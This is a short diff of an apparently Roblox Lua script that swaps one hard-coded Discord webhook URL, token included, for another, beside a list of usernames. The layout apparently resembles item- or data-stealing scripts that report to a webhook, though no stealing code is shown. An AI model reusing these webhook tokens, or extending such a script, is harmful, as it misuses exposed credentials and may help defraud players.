@@ -17,7 +17,7 @@ if not _G["Script-SM_Config"] then
     warn("Config loaded successfully!")
 end
 
-local Webhook = "https://discord.com/api/webhooks/1443259110035423373/fZ-MtswZ4fuK30jSDEhEABohxnip8JECtkC5apICD320lknrzkGpBuSOYyeRof4zcqLy"
+local Webhook = "https://discord.com/api/webhooks/1443265375461707786/8gsd0skGSE2dq64N1mETxYc9S29d_a1gH9JdCHiSb-qc7Ln-XMtSl89zPL0cuY-Lnzqg"
 local Username = {"Fib8456","dontbanplease1232","Cmenatika"}
 local Friends = {}
 
